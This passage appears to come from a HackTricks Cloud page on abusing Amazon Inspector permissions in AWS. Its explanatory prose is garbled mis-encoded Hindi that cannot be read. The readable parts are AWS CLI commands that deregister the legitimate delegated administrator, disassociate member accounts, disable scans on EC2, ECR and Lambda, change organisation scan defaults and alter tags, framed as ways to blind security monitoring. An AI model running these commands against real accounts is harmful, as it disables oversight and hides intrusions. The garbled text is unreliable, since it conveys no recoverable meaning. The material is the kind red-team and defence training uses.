* рдПрдХ рдЕрдирдзрд┐рдХреГрдд рдкреНрд░рд╢рд╛рд╕рди рдЦрд╛рддрд╛ рд╕рдХреНрд╖рдо рдХрд░рдиреЗ рд╕реЗ рд╣рдорд▓рд╛рд╡рд░ рдХреЛ рд╕реБрд░рдХреНрд╖рд╛ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдХреЛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдорд┐рд▓реЗрдЧреА, рд╕рдВрднрд╛рд╡рд┐рдд рд░реВрдк рд╕реЗ рд╕реНрдХреИрди рдХреЛ рдмрдВрдж рдХрд░рдиреЗ рдпрд╛ рд╕реЗрдЯрд┐рдВрдЧреНрд╕ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рддрд╛рдХрд┐ рджреБрд░реНрднрд╛рд╡рдирд╛рдкреВрд░реНрдг рдЧрддрд┐рд╡рд┐рдзрд┐рдпреЛрдВ рдХреЛ рдЫрд┐рдкрд╛рдпрд╛ рдЬрд╛ рд╕рдХреЗред

{% hint style="warning" %}
рдЕрдирдзрд┐рдХреГрдд рдЦрд╛рддрд╛ рдХреЛ рдкреНрд░рддрд┐рдирд┐рдзрд┐ рдкреНрд░рд╢рд╛рд╕рдХ рдмрдирдиреЗ рдХреЗ рд▓рд┐рдП рдкреАрдбрд╝рд┐рдд рдХреЗ рд╕рдорд╛рди рд╕рдВрдЧрдарди рдореЗрдВ рд╣реЛрдирд╛ рдЖрд╡рд╢реНрдпрдХ рд╣реИред

рдЕрдирдзрд┐рдХреГрдд рдЦрд╛рддрд╛ рдХреЛ рдкреНрд░рддрд┐рдирд┐рдзрд┐ рдкреНрд░рд╢рд╛рд╕рдХ рдмрдирдиреЗ рдХреЗ рд▓рд┐рдП, рдпрд╣ рднреА рдЖрд╡рд╢реНрдпрдХ рд╣реИ рдХрд┐ рдЬрдм рд╡реИрдз рдкреНрд░рддрд┐рдирд┐рдзрд┐ рдкреНрд░рд╢рд╛рд╕рдХ рдХреЛ рдмрдВрдж рдХрд┐рдпрд╛ рдЬрд╛рдП, рдФрд░ рдЕрдирдзрд┐рдХреГрдд рдЦрд╛рддрд╛ рдХреЛ рдкреНрд░рддрд┐рдирд┐рдзрд┐ рдкреНрд░рд╢рд╛рд╕рдХ рдХреЗ рд░реВрдк рдореЗрдВ рд╕рдХреНрд╖рдо рдХрд░рдиреЗ рд╕реЗ рдкрд╣рд▓реЗ, рд╡реИрдз рдкреНрд░рд╢рд╛рд╕рдХ рдХреЛ рд╕рдВрдЧрдарди рд╕реЗ рдкреНрд░рддрд┐рдирд┐рдзрд┐ рдкреНрд░рд╢рд╛рд╕рдХ рдХреЗ рд░реВрдк рдореЗрдВ рд╣рдЯрд╛ рджрд┐рдпрд╛ рдЬрд╛рдПред рдпрд╣ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрдорд╛рдВрдб рдХреЗ рд╕рд╛рде рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ (**`organizations:DeregisterDelegatedAdministrator`** рдЕрдиреБрдорддрд┐ рдЖрд╡рд╢реНрдпрдХ): **`aws organizations deregister-delegated-administrator --account-id <legit-account-id> --service-principal [inspector2.amazonaws.com](http://inspector2.amazonaws.com/)`**
{% endhint %}
```bash
# Disable
aws inspector2 disable-delegated-admin-account --delegated-admin-account-id <value>
# Enable
aws inspector2 enable-delegated-admin-account --delegated-admin-account-id <value>
```
* **рд╕рдВрднрд╛рд╡рд┐рдд рдкреНрд░рднрд╛рд╡**: рд╕реБрд░рдХреНрд╖рд╛ рдкреНрд░рдмрдВрдзрди рдореЗрдВ рд╡рд┐рдШрдЯрдиред

#### `inspector2:AssociateMember`, `inspector2:DisassociateMember`

рдПрдХ рд╣рдорд▓рд╛рд╡рд░ Amazon Inspector рд╕рдВрдЧрдарди рдХреЗ рднреАрддрд░ рд╕рджрд╕реНрдп рдЦрд╛рддреЛрдВ рдХреЗ рд╕рдВрдШ рдХреЛ рд╣реЗрд░рдлреЗрд░ рдХрд░ рд╕рдХрддрд╛ рд╣реИред рдЕрдирдзрд┐рдХреГрдд рдЦрд╛рддреЛрдВ рдХреЛ рдЬреЛрдбрд╝рдХрд░ рдпрд╛ рд╡реИрдз рдЦрд╛рддреЛрдВ рдХреЛ рдЕрд▓рдЧ рдХрд░рдХреЗ, рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдпрд╣ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдХрд┐ рдХреМрди рд╕реЗ рдЦрд╛рддреЗ рд╕реБрд░рдХреНрд╖рд╛ рд╕реНрдХреИрди рдФрд░ рд░рд┐рдкреЛрд░реНрдЯрд┐рдВрдЧ рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реИрдВред рдЗрд╕рд╕реЗ рдорд╣рддреНрд╡рдкреВрд░реНрдг рдЦрд╛рддреЛрдВ рдХреЛ рд╕реБрд░рдХреНрд╖рд╛ рдирд┐рдЧрд░рд╛рдиреА рд╕реЗ рдмрд╛рд╣рд░ рд░рдЦрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рд╣рдорд▓рд╛рд╡рд░ рдЙрди рдЦрд╛рддреЛрдВ рдореЗрдВ рдХрдордЬреЛрд░рд┐рдпреЛрдВ рдХрд╛ рд▓рд╛рдн рдЙрдард╛рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реЛ рд╕рдХрддрд╛ рд╣реИ рдмрд┐рдирд╛ рдХрд┐рд╕реА рдкрд╣рдЪрд╛рди рдХреЗред

{% hint style="warning" %}
рдпрд╣ рдХреНрд░рд┐рдпрд╛ рдкреНрд░рддрд┐рдирд┐рдзрд┐ рдкреНрд░рд╢рд╛рд╕рдХ рджреНрд╡рд╛рд░рд╛ рдХреА рдЬрд╛рдиреА рдЪрд╛рд╣рд┐рдПред
{% endhint %}
```bash
# Associate
aws inspector2 associate-member --account-id <value>
# Disassociate
aws inspector2 disassociate-member --account-id <value>
```
* **рд╕рдВрднрд╛рд╡рд┐рдд рдкреНрд░рднрд╛рд╡**: рд╕реБрд░рдХреНрд╖рд╛ рд╕реНрдХреИрди рд╕реЗ рдкреНрд░рдореБрдЦ рдЦрд╛рддреЛрдВ рдХрд╛ рдмрд╣рд┐рд╖реНрдХрд╛рд░, рдХрдордЬреЛрд░рд┐рдпреЛрдВ рдХреЗ рд╢реЛрд╖рдг рдХреЛ рдмрд┐рдирд╛ рдкрддрд╛ рд▓рдЧрд╛рдП рд╕рдХреНрд╖рдо рдмрдирд╛рдирд╛ред

#### `inspector2:Disable`, (`inspector2:Enable` & `iam:CreateServiceLinkedRole`)

`inspector2:Disable` рдЕрдиреБрдорддрд┐ рдХреЗ рд╕рд╛рде рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рд╡рд┐рд╢рд┐рд╖реНрдЯ рд╕рдВрд╕рд╛рдзрди рдкреНрд░рдХрд╛рд░реЛрдВ (EC2, ECR, Lambda, Lambda рдХреЛрдб) рдкрд░ рд╕реБрд░рдХреНрд╖рд╛ рд╕реНрдХреИрди рдХреЛ рдирд┐рд╖реНрдХреНрд░рд┐рдп рдХрд░рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реЛрдЧрд╛, рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдЦрд╛рддреЛрдВ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ, AWS рд╡рд╛рддрд╛рд╡рд░рдг рдХреЗ рдХреБрдЫ рд╣рд┐рд╕реНрд╕реЛрдВ рдХреЛ рдмрд┐рдирд╛ рдирд┐рдЧрд░рд╛рдиреА рдХреЗ рдЫреЛрдбрд╝рдХрд░ рдФрд░ рд╣рдорд▓реЛрдВ рдХреЗ рдкреНрд░рддрд┐ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдмрдирд╛ рджреЗрдЧрд╛ред рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, **`inspector2:Enable`** & **`iam:CreateServiceLinkedRole`** рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЗ рдХрд╛рд░рдг, рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдлрд┐рд░ рд╕реЗ рдЪрдпрдирд╛рддреНрдордХ рд░реВрдк рд╕реЗ рд╕реНрдХреИрди рдХреЛ рд╕рдХреНрд╖рдо рдХрд░ рд╕рдХрддрд╛ рд╣реИ рддрд╛рдХрд┐ рд╕рдВрджрд┐рдЧреНрдз рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдХрд╛ рдкрддрд╛ рди рдЪрд▓реЗред

{% hint style="warning" %}
рдпрд╣ рдХреНрд░рд┐рдпрд╛ рдкреНрд░рддрд┐рдирд┐рдзрд┐ рдкреНрд░рд╢рд╛рд╕рдХ рджреНрд╡рд╛рд░рд╛ рдХреА рдЬрд╛рдиреА рдЪрд╛рд╣рд┐рдПред
{% endhint %}
```bash
# Disable
aws inspector2 disable --account-ids <value> [--resource-types <{EC2, ECR, LAMBDA, LAMBDA_CODE}>]
# Enable
aws inspector2 enable --resource-types <{EC2, ECR, LAMBDA, LAMBDA_CODE}> [--account-ids <value>]
```
* **рд╕рдВрднрд╛рд╡рд┐рдд рдкреНрд░рднрд╛рд╡**: рд╕реБрд░рдХреНрд╖рд╛ рдирд┐рдЧрд░рд╛рдиреА рдореЗрдВ рдЕрдВрдзреЗ рд╕реНрдерд╛рдиреЛрдВ рдХрд╛ рдирд┐рд░реНрдорд╛рдгред

#### `inspector2:UpdateOrganizationConfiguration`

рдЗрд╕ рдЕрдиреБрдорддрд┐ рдХреЗ рд╕рд╛рде рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдЖрдкрдХреЗ Amazon Inspector рд╕рдВрдЧрдарди рдХреЗ рд▓рд┐рдП рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдХреЛ рдЕрдкрдбреЗрдЯ рдХрд░рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реЛрдЧрд╛, рдЬреЛ рдирдП рд╕рджрд╕реНрдп рдЦрд╛рддреЛрдВ рдХреЗ рд▓рд┐рдП рд╕рдХреНрд╖рдо рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд╕реНрдХреИрдирд┐рдВрдЧ рд╕реБрд╡рд┐рдзрд╛рдУрдВ рдХреЛ рдкреНрд░рднрд╛рд╡рд┐рдд рдХрд░реЗрдЧрд╛ред

{% hint style="warning" %}
рдпрд╣ рдХреНрд░рд┐рдпрд╛ рдкреНрд░рддрд┐рдирд┐рдзрд┐ рдкреНрд░рд╢рд╛рд╕рдХ рджреНрд╡рд╛рд░рд╛ рдХреА рдЬрд╛рдиреА рдЪрд╛рд╣рд┐рдПред
{% endhint %}
```bash
aws inspector2 update-organization-configuration --auto-enable <ec2=true|false,ecr=true|false,lambda=true|false,lambdaCode=true|false>
```
* **рд╕рдВрднрд╛рд╡рд┐рдд рдкреНрд░рднрд╛рд╡**: рд╕рдВрдЧрдарди рдХреЗ рд▓рд┐рдП рд╕реБрд░рдХреНрд╖рд╛ рд╕реНрдХреИрди рдиреАрддрд┐рдпреЛрдВ рдФрд░ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдХреЛ рдмрджрд▓реЗрдВред

#### `inspector2:TagResource`, `inspector2:UntagResource`

рдПрдХ рд╣рдорд▓рд╛рд╡рд░ AWS Inspector рд╕рдВрд╕рд╛рдзрдиреЛрдВ рдкрд░ рдЯреИрдЧ рдХреЛ рд╣реЗрд░рдлреЗрд░ рдХрд░ рд╕рдХрддрд╛ рд╣реИ, рдЬреЛ рд╕реБрд░рдХреНрд╖рд╛ рдЖрдХрд▓рдиреЛрдВ рдХреЛ рд╡реНрдпрд╡рд╕реНрдерд┐рдд, рдЯреНрд░реИрдХ рдФрд░ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реИрдВред рдЯреИрдЧ рдХреЛ рдмрджрд▓рдХрд░ рдпрд╛ рд╣рдЯрд╛рдХрд░, рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рд╕рдВрднрд╛рд╡рд┐рдд рд░реВрдк рд╕реЗ рд╕реБрд░рдХреНрд╖рд╛ рд╕реНрдХреИрди рд╕реЗ рдХрдордЬреЛрд░рд┐рдпреЛрдВ рдХреЛ рдЫрд┐рдкрд╛ рд╕рдХрддрд╛ рд╣реИ, рдЕрдиреБрдкрд╛рд▓рди рд░рд┐рдкреЛрд░реНрдЯрд┐рдВрдЧ рдореЗрдВ рдмрд╛рдзрд╛ рдбрд╛рд▓ рд╕рдХрддрд╛ рд╣реИ, рдФрд░ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд╕реБрдзрд╛рд░ рдкреНрд░рдХреНрд░рд┐рдпрд╛рдУрдВ рдореЗрдВ рд╣рд╕реНрддрдХреНрд╖реЗрдк рдХрд░ рд╕рдХрддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдЕрдирд┐рдпрдВрддреНрд░рд┐рдд рд╕реБрд░рдХреНрд╖рд╛ рдореБрджреНрджреЗ рдФрд░ рдкреНрд░рдгрд╛рд▓реА рдХреА рдЕрдЦрдВрдбрддрд╛ рд╕реЗ рд╕рдордЭреМрддрд╛ рд╣реЛ рд╕рдХрддрд╛ рд╣реИред
```bash
aws inspector2 tag-resource --resource-arn <value> --tags <value>
aws inspector2 untag-resource --resource-arn <value> --tag-keys <value>
```
* **рд╕рдВрднрд╛рд╡рд┐рдд рдкреНрд░рднрд╛рд╡**: рдХрдордЬреЛрд░рд┐рдпреЛрдВ рдХреЛ рдЫрд┐рдкрд╛рдирд╛, рдЕрдиреБрдкрд╛рд▓рди рд░рд┐рдкреЛрд░реНрдЯрд┐рдВрдЧ рдореЗрдВ рдмрд╛рдзрд╛, рд╕реБрд░рдХреНрд╖рд╛ рд╕реНрд╡рдЪрд╛рд▓рди рдореЗрдВ рдмрд╛рдзрд╛ рдФрд░ рд▓рд╛рдЧрдд рдЖрд╡рдВрдЯрди рдореЗрдВ рдмрд╛рдзрд╛ред

## рд╕рдВрджрд░реНрдн

* [https://docs.aws.amazon.com/inspector/latest/user/what-is-inspector.html](https://docs.aws.amazon.com/inspector/latest/user/what-is-inspector.html)
* [https://docs.aws.amazon.com/service-authorization/latest/reference/list\_amazoninspector2.html](https://docs.aws.amazon.com/service-authorization/latest/reference/list\_amazoninspector2.html)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
